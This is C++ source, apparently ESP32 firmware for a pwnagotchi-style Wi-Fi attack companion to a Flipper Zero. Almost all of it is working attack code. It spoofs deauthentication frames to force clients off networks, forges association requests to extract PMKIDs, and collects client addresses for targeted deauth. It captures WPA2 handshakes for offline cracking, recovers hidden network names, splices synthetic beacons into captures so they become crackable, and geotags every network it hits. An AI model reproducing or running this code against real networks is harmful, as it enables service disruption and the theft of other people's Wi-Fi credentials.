        esp_wifi_set_channel(_cur_channel, WIFI_SECOND_CHAN_NONE); // back for rx/attack
        delay(1);
    } else {
        // just beacon on the recon/attack channel (radio may have hopped this tick).
        esp_wifi_set_channel(_cur_channel, WIFI_SECOND_CHAN_NONE);
        delay(1);
        for (int i = 0; i < 3; i++) {
            esp_wifi_80211_tx(WIFI_IF_AP, _frame, _frame_len, false);
            _sent++;
        }
    }

    // single write so it can't interleave with the rx callback's prints.
    char line[128];
    int n = snprintf(line, sizeof(line),
                     "PWNPAL_ADV name=%s ch=%u sent=%u ver=%d fw=%s pin=%d tgt=%d ncmd=%lu\n",
                     _name, (unsigned)_cur_channel, (unsigned)_sent, PWNPAL_PROTO,
                     PWNPAL_FW_COMMIT, _pinned_channel, _target_set ? 1 : 0,
                     (unsigned long)_cmd_count);
    if (n < 0) return;
    if (n >= (int)sizeof(line)) n = sizeof(line) - 1;
    Serial.write((const uint8_t*)line, n);
}

// deep-saver duty cycle. the pump acts on the return: 0 keep scanning, 1 doze now (stop
// radio), 2 wake now (restart radio), 3 stay dozing. emits PWNPAL_DOZE while dozing so the
// Flipper link watchdog doesn't cry "no ESP32".
int Pwnpal::saverTick(uint32_t now) {
    if (_saver < 2) {
        if (_saver_idle) { _saver_idle = false; return 2; }  // left deep mid-doze -> wake radio
        return 0;
    }
    if (_saver_phase_ms == 0) _saver_phase_ms = now;
    if (!_saver_idle) {
        if (now - _saver_phase_ms >= SAVER_ON_MS) {
            _saver_idle = true;
            _saver_phase_ms = now;
            _saver_hb_ms = now;
            const char* d = "PWNPAL_DOZE\n";
            Serial.write((const uint8_t*)d, 15);
            return 1;
        }
        return 0;
    }
    if (now - _saver_phase_ms >= SAVER_OFF_MS) {
        _saver_idle = false;
        _saver_phase_ms = now;
        return 2;
    }
    if (now - _saver_hb_ms >= 3000) {  // < the Flipper's 5s link-timeout so it never cries
        _saver_hb_ms = now;
        const char* d = "PWNPAL_DOZE\n";
        Serial.write((const uint8_t*)d, 15);
    }
    return 3;
}

// periodic fix status so the Flipper can watch acquisition / log TTFF. throttled, and
// emitted even with no fix (sats climbing from 0 is the useful signal). raw module strings.
void Pwnpal::reportGps(bool fix, int sats, float acc_m, const char* lat, const char* lon) {
    uint32_t now = millis();
    if (now - _last_gps_ms < PWNPAL_GPS_EMIT_MS) return;
    _last_gps_ms = now;
    int acc = (int)(acc_m + 0.5f);
    if (acc < 0) acc = 0;
    char line[96];
    int n = snprintf(line, sizeof(line), "PWNPAL_GPS fix=%d sats=%d acc=%d lat=%s lon=%s\n",
                     fix ? 1 : 0, sats, acc, lat ? lat : "", lon ? lon : "");
    if (n < 0) return;
    if (n >= (int)sizeof(line)) n = sizeof(line) - 1;
    Serial.write((const uint8_t*)line, n);
}

// cache the live fix; when it's gone, hand back the last-known one if it's still fresh enough.
// keeps geotagging APs/captures/peers through a walk's fix gaps (rough, refined later).
bool Pwnpal::geoResolve(bool has_fix, double* lat, double* lon) {
    if (has_fix) {
        _have_lastfix = true;
        _lastfix_lat = *lat;
        _lastfix_lon = *lon;
        _lastfix_ms = millis();
        return true;
    }
    if (_have_lastfix && (millis() - _lastfix_ms) <= LASTFIX_TTL_MS) {
        *lat = _lastfix_lat;
        *lon = _lastfix_lon;
        return true;
    }
    return false;
}

void Pwnpal::reportPeer(const uint8_t* payload, int length, int rssi, int channel,
                           bool has_fix, double lat, double lon) {
    // locate the JSON like Marauder's processPwnagotchiBeacon.
    int start = 36, end = length;
    while (start < length && payload[start] != '{') start++;
    while (end > start && payload[end - 1] != '}') end--;
    if (start >= end) return;

    String json = String((char*)payload + start, end - start);

    StaticJsonDocument<2048> doc;
    if (deserializeJson(doc, json)) return;
    if (!doc.containsKey("name")) return;

    const char* name = doc["name"] | "???";
    const char* ident = doc["identity"] | "";
    int pwnd_tot = doc["pwnd_tot"] | 0;
    int pwnd_run = doc["pwnd_run"] | 0;
    long uptime = doc["uptime"] | 0;
    bool deauth = doc["policy"]["deauth"] | false;

    char safe_name[33];
    char safe_ident[65];
    sanitize(name, safe_name, sizeof(safe_name));
    sanitize(ident, safe_ident, sizeof(safe_ident));

    has_fix = geoResolve(has_fix, &lat, &lon); // live fix, else recent last-known
    char geo[48];
    fmt_geo(geo, sizeof(geo), has_fix, lat, lon);

    // one PWNPAL_-prefixed line, single write so it can't interleave with broadcast()'s prints.
    char line[320];
    int n = snprintf(line, sizeof(line),
        "PWNPAL_PEER {\"name\":\"%s\",\"identity\":\"%s\",\"pwnd_tot\":%d,"
        "\"pwnd_run\":%d,\"uptime\":%ld,\"rssi\":%d,\"channel\":%d,\"deauth\":%s%s}\n",
        safe_name, safe_ident, pwnd_tot, pwnd_run, uptime, rssi, channel,
        deauth ? "true" : "false", geo);
    if (n < 0) return;
    if (n >= (int)sizeof(line)) n = sizeof(line) - 1;
    Serial.write((const uint8_t*)line, n);
}

int Pwnpal::reconIndex(const uint8_t* bssid) const {
    for (int i = 0; i < _n_recon; i++)
        if (memcmp(_recon[i].bssid, bssid, 6) == 0) return i;
    return -1;
}

bool Pwnpal::isPwnd(const uint8_t* bssid) const {
    for (int i = 0; i < _n_pwnd_seen; i++)
        if (memcmp(_pwnd_seen[i], bssid, 6) == 0) return true;
    return false;
}

bool Pwnpal::markPwnd(const uint8_t* bssid) {
    for (int i = 0; i < _n_pwnd_seen; i++)
        if (memcmp(_pwnd_seen[i], bssid, 6) == 0) return false;  // already counted
    if (_n_pwnd_seen >= MAX_PWND) return false;                  // table full: stop
    memcpy(_pwnd_seen[_n_pwnd_seen++], bssid, 6);
    return true;
}

void Pwnpal::emitPwnd(const uint8_t* bssid, const char* ssid,
                         const char* type, int channel, int rssi,
                         bool has_fix, double lat, double lon, bool active) {
    char mac[18];
    fmt_mac(mac, bssid);
    char geo[48];
    fmt_geo(geo, sizeof(geo), has_fix, lat, lon);
    char line[256];
    int n = snprintf(line, sizeof(line),
        "PWNPAL_PWND {\"bssid\":\"%s\",\"ssid\":\"%s\",\"type\":\"%s\","
        "\"channel\":%d,\"rssi\":%d,\"via\":\"%s\"%s}\n",
        mac, ssid, type, channel, rssi, active ? "active" : "passive", geo);
    if (n < 0) return;
    if (n >= (int)sizeof(line)) n = sizeof(line) - 1;
    Serial.write((const uint8_t*)line, n);
}

void Pwnpal::deauthAP(const uint8_t* bssid) {
    uint8_t f[26];
    memcpy(f, DEAUTH_TEMPLATE, sizeof(f));
    memcpy(f + 10, bssid, 6);   // Addr2 = BSSID
    memcpy(f + 16, bssid, 6);   // Addr3 = BSSID
    for (int i = 0; i < 3; i++)
        esp_wifi_80211_tx(WIFI_IF_AP, f, sizeof(f), false);
}

void Pwnpal::deauthClient(const uint8_t* bssid, const uint8_t* client) {
    // spoof BOTH directions — what actually kicks a modern client (broadcast deauth is ignored).
    uint8_t f[26];
    memcpy(f, DEAUTH_TEMPLATE, sizeof(f));
    memcpy(f + 4, client, 6);   // Addr1 dst = client   (frame appears from the AP)
    memcpy(f + 10, bssid, 6);   // Addr2 src = BSSID
    memcpy(f + 16, bssid, 6);   // Addr3 = BSSID
    for (int i = 0; i < 2; i++)
        esp_wifi_80211_tx(WIFI_IF_AP, f, sizeof(f), false);
    memcpy(f + 4, bssid, 6);    // Addr1 dst = AP        (frame appears from the client)
    memcpy(f + 10, client, 6);  // Addr2 src = client
    memcpy(f + 16, bssid, 6);   // Addr3 = BSSID
    for (int i = 0; i < 2; i++)
        esp_wifi_80211_tx(WIFI_IF_AP, f, sizeof(f), false);
}

void Pwnpal::assocAP(const uint8_t* bssid, const char* ssid) {
    // open-system auth FIRST so the AP answers the assoc with EAPOL M1 (RSN PMKID);
    // a bare assoc-req is a class-2 frame it rejects.
    {
        uint8_t a[30];
        memcpy(a, AUTH_TEMPLATE, sizeof(a));
        memcpy(a + 4, bssid, 6);          // Addr1 dst = target AP
        memcpy(a + 10, _session_id, 6);   // Addr2 src = our station MAC
        memcpy(a + 16, bssid, 6);         // Addr3 bssid = target AP
        for (int i = 0; i < 2; i++)
            esp_wifi_80211_tx(WIFI_IF_AP, a, sizeof(a), false);
        delay(2);                          // let the AP process auth before assoc
    }

    // header(28) + SSID IE(2+<=32) + Supported Rates IE(6) + RSN IE(22) <= 90.
    uint8_t f[96];
    memcpy(f, ASSOC_TEMPLATE, sizeof(ASSOC_TEMPLATE));
    memcpy(f + 4, bssid, 6);          // Addr1 dst = target AP (unicast)
    memcpy(f + 10, _session_id, 6);   // Addr2 src = our station MAC
    memcpy(f + 16, bssid, 6);         // Addr3 bssid = target AP
    int p = sizeof(ASSOC_TEMPLATE);

    // SSID IE (tag 0) — the target AP.
    int slen = ssid ? (int)strlen(ssid) : 0;
    if (slen > 32) slen = 32;
    f[p++] = 0x00;
    f[p++] = (uint8_t)slen;
    memcpy(f + p, ssid, slen); p += slen;

    // Supported Rates IE (1/2/5.5/11 Mbps).
    static const uint8_t RATES[6] = {0x01, 0x04, 0x82, 0x04, 0x0b, 0x16};
    memcpy(f + p, RATES, sizeof(RATES)); p += sizeof(RATES);

    // RSN IE (WPA2-PSK/CCMP), verbatim from Marauder: makes the AP treat us as RSN so
    // its M1 carries the PMKID reportHandshake() pulls out.
    static const uint8_t RSN[22] = {
        0x30, 0x14,                         // RSN tag, len 20
        0x01, 0x00,                         // version
        0x00, 0x0f, 0xac, 0x04,             // group cipher: CCMP
        0x01, 0x00,                         // pairwise count
        0x00, 0x0f, 0xac, 0x04,             // pairwise cipher: CCMP
        0x01, 0x00,                         // AKM count
        0x00, 0x0f, 0xac, 0x02,             // AKM: WPA2-PSK
        0x8c, 0x00                          // RSN caps + MFPC so 802.11w APs still accept the assoc
    };
    memcpy(f + p, RSN, sizeof(RSN)); p += sizeof(RSN);

    // a couple copies — enough to solicit, not a flood.
    for (int i = 0; i < 2; i++)
        esp_wifi_80211_tx(WIFI_IF_AP, f, p, false);
}

void Pwnpal::streamFrameHex(const uint8_t* bssid, const uint8_t* frame, int length) {
    if (length <= 0) return;
    static const char* hexd = "0123456789abcdef";
    // "PWNPAL_HS "+bssid+' '+hex+'\n'. static (rx-callback only) so a big frame doesn't
    // blow the stack; single write so it can't interleave with the main loop's prints.
    static char line[800];
    const int PREFIX = sizeof("PWNPAL_HS ") - 1;    // 10; the app parses the bssid at this offset
    int max_bytes = (int)(sizeof(line) - PREFIX - 12 - 1 - 1) / 2;  // bssid+sp+nl
    if (length > max_bytes) length = max_bytes;     // truncate huge frames (ESSID near front survives)
    int p = 0;
    memcpy(line, "PWNPAL_HS ", PREFIX); p = PREFIX;
    for (int i = 0; i < 6; i++) {
        line[p++] = hexd[bssid[i] >> 4];
        line[p++] = hexd[bssid[i] & 0x0f];
    }
    line[p++] = ' ';
    for (int i = 0; i < length; i++) {
        line[p++] = hexd[frame[i] >> 4];
        line[p++] = hexd[frame[i] & 0x0f];
    }
    line[p++] = '\n';
    Serial.write((const uint8_t*)line, p);
}

void Pwnpal::reportClient(const uint8_t* payload, int length) {
    // harvest the client STA from a DATA frame for unicast deauth. allocation-free (rx
    // callback). client is the non-BSSID address per the DS bits.
    if (length < 24) return;
    if ((payload[0] & 0x0c) != 0x08) return;               // type == DATA only
    bool tods = payload[1] & 0x01, fromds = payload[1] & 0x02;
    const uint8_t *bssid, *client;
    if (fromds && !tods) { bssid = payload + 10; client = payload + 4; }   // AP->STA
    else if (tods && !fromds) { bssid = payload + 4; client = payload + 10; } // STA->AP
    else return;                                            // IBSS/WDS: ambiguous, skip
    if (client[0] & 0x01) return;                           // multicast/broadcast, not a STA
    int ai = reconIndex(bssid);
    if (ai < 0) return;                                     // only clients of known APs
    uint32_t now = millis();
    for (int i = 0; i < _n_sta; i++)
        if (memcmp(_sta[i].mac, client, 6) == 0) {
            _sta[i].ap_idx = (uint8_t)ai;                   // re-target if it roamed to another known AP
            _sta[i].last_seen = now;
            return;
        }
    int slot;
    bool append = (_n_sta < MAX_STA);
    if (append) {
        slot = _n_sta;
    } else {
        // table full: evict least-recently-seen (last_seen load-bearing).
        slot = 0;
        for (int i = 1; i < _n_sta; i++)
            if ((uint32_t)(now - _sta[i].last_seen) > (uint32_t)(now - _sta[slot].last_seen)) slot = i;
    }
    memcpy(_sta[slot].mac, client, 6);
    _sta[slot].ap_idx = (uint8_t)ai;
    _sta[slot].last_seen = now;
    // publish entry before count so the loop reader can't see a half-written slot.
    if (append) { __sync_synchronize(); _n_sta = slot + 1; }
}

void Pwnpal::streamSyntheticBeacon(const uint8_t* bssid, const char* ssid) {
    if (!ssid || !ssid[0]) return;                         // unknown/hidden -> can't help
    int slen = (int)strlen(ssid);
    if (slen > 32) slen = 32;
    uint8_t b[110];
    int p = 0;
    static const uint8_t HEAD[] = {
        0x80, 0x00, 0x00, 0x00,                            // FC beacon, duration
        0xff, 0xff, 0xff, 0xff, 0xff, 0xff                 // Addr1 broadcast
    };
    memcpy(b + p, HEAD, sizeof(HEAD)); p += sizeof(HEAD);
    memcpy(b + p, bssid, 6); p += 6;                       // Addr2 = BSSID
    memcpy(b + p, bssid, 6); p += 6;                       // Addr3 = BSSID
    b[p++] = 0x00; b[p++] = 0x00;                          // seq-ctl
    memset(b + p, 0, 8); p += 8;                           // timestamp
    b[p++] = 0x64; b[p++] = 0x00;                          // beacon interval
    b[p++] = 0x11; b[p++] = 0x00;                          // caps: ESS + Privacy
    b[p++] = 0x00; b[p++] = (uint8_t)slen;                 // SSID IE
    memcpy(b + p, ssid, slen); p += slen;
    static const uint8_t RATES[] = {0x01, 0x04, 0x82, 0x84, 0x8b, 0x96};
    memcpy(b + p, RATES, sizeof(RATES)); p += sizeof(RATES);
    static const uint8_t RSN[] = {                         // WPA2-PSK/CCMP, so 22000 sees AKM
        0x30, 0x14, 0x01, 0x00, 0x00, 0x0f, 0xac, 0x04, 0x01, 0x00,
        0x00, 0x0f, 0xac, 0x04, 0x01, 0x00, 0x00, 0x0f, 0xac, 0x02, 0x0c, 0x00
    };
    memcpy(b + p, RSN, sizeof(RSN)); p += sizeof(RSN);
    streamFrameHex(bssid, b, p);
}

bool Pwnpal::reportAP(const uint8_t* payload, int length, int rssi, int channel,
                         bool has_fix, double lat, double lon) {
    // beacon (0x80) or probe response (0x50): both carry the SSID IE after the same 12B
    // fixed params. probe responses recover ESSIDs we'd otherwise miss.
    if (length < 38 || (payload[0] != 0x80 && payload[0] != 0x50)) return false;
    const uint8_t* bssid = payload + 10;                    // Addr2 = BSSID
    int8_t r = (rssi < -128 || rssi > 0) ? 0 : (int8_t)rssi;
    has_fix = geoResolve(has_fix, &lat, &lon); // live fix, else recent last-known

    // SSID IE (tag 0x00) is the first tagged param, at offset 36.
    char ssid[33] = {0};
    if (payload[36] == 0x00) {
        int slen = payload[37];
        if (slen > 32) slen = 32;
        if (38 + slen <= length) {
            char raw[33];
            for (int i = 0; i < slen; i++) raw[i] = (char)payload[38 + i];
            raw[slen] = '\0';
            sanitize(raw, ssid, sizeof(ssid));
        }
    }

    int known = reconIndex(bssid);
    if (known >= 0) {                                       // re-heard
        if (r != 0) _recon[known].rssi = r;                // keep attackable()/targeting live
        _recon[known].seen_ms = millis();                  // unthrottled last-heard, for recede sensing
        // late ESSID: adopt the newly-revealed name, push the naming frame into the pcap,
        // re-announce so a keymat-only capture becomes crackable.
        if (_recon[known].ssid[0] == '\0' && ssid[0] != '\0') {
            strncpy(_recon[known].ssid, ssid, sizeof(_recon[known].ssid) - 1);
            _recon[known].ssid[sizeof(_recon[known].ssid) - 1] = '\0';
            streamFrameHex(bssid, payload, length);
            char mac[18];
            fmt_mac(mac, bssid);
            char geo[48];
            fmt_geo(geo, sizeof(geo), has_fix, lat, lon);
            char line[256];
            int n = snprintf(line, sizeof(line),
                "PWNPAL_AP {\"bssid\":\"%s\",\"ssid\":\"%s\",\"channel\":%d,\"rssi\":%d%s}\n",
                mac, ssid, channel, rssi, geo);
            if (n > 0)
                Serial.write((const uint8_t*)line,
                             (size_t)(n >= (int)sizeof(line) ? sizeof(line) - 1 : n));
        }
        uint32_t now = millis();
        if (now - _recon[known].last_rssi_ms >= PWNPAL_RSSI_EMIT_MS) {
            _recon[known].last_rssi_ms = now;
            char mac[18];
            fmt_mac(mac, bssid);
            char line[56];
            // append live clients + attack bursts aimed at this AP (Flipper AP-detail view)
            int n = snprintf(line, sizeof(line), "PWNPAL_RSSI %s %d %d %d\n", mac, (int)r,
                             clientCount(known), (int)_recon[known].attacks);
            if (n > 0) Serial.write((const uint8_t*)line, (size_t)n);
        }
        return false;                                      // not a new AP
    }
    if (_n_recon >= MAX_RECON) return false;                // table full

    memcpy(_recon[_n_recon].bssid, bssid, 6);
    strncpy(_recon[_n_recon].ssid, ssid, sizeof(_recon[_n_recon].ssid) - 1);
    _recon[_n_recon].ssid[sizeof(_recon[_n_recon].ssid) - 1] = '\0';
    _recon[_n_recon].channel = (uint8_t)channel;
    _recon[_n_recon].rssi = r;  // first-seen; refreshed on later beacons
    _recon[_n_recon].attacks = 0;
    _recon[_n_recon].missed = false;
    _recon[_n_recon].pmf = pwnpal_rsn_requires_pmf(payload, length); // 802.11w -> no deauth
    _recon[_n_recon].last_rssi_ms = millis();  // the PWNPAL_AP line already carried it
    _recon[_n_recon].rssi_ref = r;             // seed; not a cohort member until it survives an epoch
    _recon[_n_recon].ref_valid = false;
    _recon[_n_recon].seen_ms = millis();
    _ep_adds++;                                 // leading-edge movement: a BSSID just entered range
    // Publish the entry before bumping the count (rx-callback writer vs loop reader).
    __sync_synchronize();
    _n_recon++;

    // no more ESSID-only pcaps: it made one uncrackable file per AP. the ESSID is spliced
    // in Flipper-side when a handshake arrives; a pcap exists only for an AP we capture.

    char mac[18];
    fmt_mac(mac, bssid);
    char geo[48];
    fmt_geo(geo, sizeof(geo), has_fix, lat, lon);
    char line[256];
    int n = snprintf(line, sizeof(line),
        "PWNPAL_AP {\"bssid\":\"%s\",\"ssid\":\"%s\",\"channel\":%d,"
        "\"rssi\":%d%s}\n",
        mac, ssid, channel, rssi, geo);
    if (n < 0) return true;
    if (n >= (int)sizeof(line)) n = sizeof(line) - 1;
    Serial.write((const uint8_t*)line, n);
    return true;
}

// De-cloak: a client's (re)association request to a HIDDEN AP names the ESSID in the clear.
// We already deauth clients (forcing reconnects); this harvests the ESSID a reconnect reveals
// and adopts it. Emitting PWNPAL_AP makes the Flipper adopt the name and splice an ESSID beacon
// into an already-captured handshake pcap -> a hidden-AP capture becomes crackable.
// assoc-req = mgmt subtype 0x00, reassoc-req = 0x20; both are directed AT the AP, so Addr1=BSSID.
void Pwnpal::reportDecloak(const uint8_t* payload, int length, int rssi, int channel,
                           bool has_fix, double lat, double lon) {
    if (length < 30) return;
    uint8_t sub = payload[0] & 0xf0;
    if (sub != 0x00 && sub != 0x20) return;               // assoc-req / reassoc-req only
    const uint8_t* bssid = payload + 4;                    // Addr1 = the AP being (re)joined
    int ri = reconIndex(bssid);
    if (ri < 0) return;                                    // need the known AP (for its ESSID anyway)
    has_fix = geoResolve(has_fix, &lat, &lon);

    // Passive PMKID: a roaming client's (re)assoc RSN IE can carry a cached PMKID for this AP, which
    // cracks with -m 22000 just like an AP M1 PMKID. Harvest it once per AP — save the frame (offline
    // tools and the Flipper's own check read the PMKID out) and count it. Free loot we'd else drop.
    uint8_t pmk[16];
    if (pwnpal_assoc_pmkid(payload, length, pmk) && markPwnd(bssid)) {
        streamFrameHex(bssid, payload, length);
        streamSyntheticBeacon(bssid, _recon[ri].ssid);     // splice ESSID (no-op if still unknown)
        _epoch_pwnd = true;
        _ep_pmkid++;
        emitPwnd(bssid, _recon[ri].ssid, "pmkid", channel, rssi, has_fix, lat, lon,
                 _recon[ri].attacks > 0);
    }

    // De-cloak: recover a hidden ESSID from the (re)assoc SSID IE.
    int ie = (sub == 0x20) ? 34 : 28;   // reassoc adds the 6-byte current-AP address before the IEs
    if (ie + 2 > length || payload[ie] != 0x00) return;   // SSID must be the first tagged param
    int slen = payload[ie + 1];
    if (slen <= 0 || slen > 32 || ie + 2 + slen > length) return;  // len 0 = still cloaked
    if (_recon[ri].ssid[0] != '\0') return;               // already named
    char raw[33], ssid[33];
    memcpy(raw, payload + ie + 2, slen);
    raw[slen] = '\0';
    sanitize(raw, ssid, sizeof(ssid));
    if (!ssid[0]) return;
    strncpy(_recon[ri].ssid, ssid, sizeof(_recon[ri].ssid) - 1);
    _recon[ri].ssid[sizeof(_recon[ri].ssid) - 1] = '\0';
    _ep_dcloak++;                                          // telemetry: a hidden AP named this epoch
    char mac[18];
    fmt_mac(mac, bssid);
    char geo[48];
    fmt_geo(geo, sizeof(geo), has_fix, lat, lon);
    char line[256];
    // "dc":1 marks this as a de-cloak (hidden ESSID recovered from a client) so the Flipper can
    // flag the AP in the browser + log who was de-cloaked, vs an ordinary late-beacon name.
    int n = snprintf(line, sizeof(line),
        "PWNPAL_AP {\"bssid\":\"%s\",\"ssid\":\"%s\",\"channel\":%d,\"rssi\":%d%s,\"dc\":1}\n",
        mac, ssid, channel, rssi, geo);
    if (n > 0)
        Serial.write((const uint8_t*)line,
                     (size_t)(n >= (int)sizeof(line) ? sizeof(line) - 1 : n));
}

bool Pwnpal::reportHandshake(const uint8_t* payload, int length, int rssi, int channel,
                                bool has_fix, double lat, double lon) {
    // locate EAPOL (0x888e etherType) -> offset of the 802.1X header. see pwnpal_frames.h.
    int eo = pwnpal_eapol_locate(payload, length);
    if (eo < 0) return false;                            // not EAPOL

    has_fix = geoResolve(has_fix, &lat, &lon); // live fix, else recent last-known

    // BSSID + client (the non-AP station) from the DS bits; BSSID up front so the streamed frame
    // self-describes its pcap, client for per-(AP,client) 4-way pairing below.
    const uint8_t* client = nullptr;
    const uint8_t* bssid = pwnpal_ds_bssid(payload, length, &client);

    streamFrameHex(bssid, payload, length);              // full EAPOL frame -> pcap

    PwnpalEapolKey k;
    if (!pwnpal_eapol_key(payload, length, eo, &k)) return true; // EAPOL but not a key / truncated

    int ri = reconIndex(bssid);
    uint32_t now = millis();
    int msg = pwnpal_eapol_msg(&k); // 1/2/3, or 0 for M4 / non-handshake message

    // Loose, pwnagotchi/bettercap-style count only: PMKID, or M2 with an M1/M3. Lights the skull /
    // count so the number matches what a pwnagotchi would claim. The STRICT "is it actually
    // crackable" verdict now lives Flipper-side (it owns the .pcap, so it judges the bytes it
    // actually saved, evolves as more frames arrive, and needs no firmware match). See pwnpal_hs_note.
    const char* type = nullptr;
    if (msg == 1 && k.pmkid_nz) {                        // PMKID: self-contained, no recon/pairing
        type = "pmkid";
    } else if (msg && k.nonce_nz && ri >= 0) {           // M1/M2/M3 with a real nonce, known AP
        PwnpalHsVerdict v = pwnpal_hs_note(_hs, MAX_HS_HALFS, (uint8_t)ri, client, msg, false,
                                           k.kdv, k.replay, now, HS_CRACK_WINDOW_MS);
        if (v.loose) type = "handshake";
    }

    if (type && markPwnd(bssid)) {
        _epoch_pwnd = true;   // real activity this epoch -> keeps recon at full speed
        const char* ssid = (ri >= 0) ? _recon[ri].ssid : "";
        // provenance: our attack vs an organic sniff -> active/passive telemetry.
        bool active = (ri >= 0) && _recon[ri].attacks > 0;
        if (strcmp(type, "pmkid") == 0) _ep_pmkid++;
        else _ep_hs++;
        // guarantee the ESSID is in this pcap (EAPOL-as-DATA caps are otherwise
        // uncrackable). no-op if SSID unknown.
        streamSyntheticBeacon(bssid, ssid);
        emitPwnd(bssid, ssid, type, channel, rssi, has_fix, lat, lon, active);
    }
    return true;                                         // EAPOL -> save to pcap
}
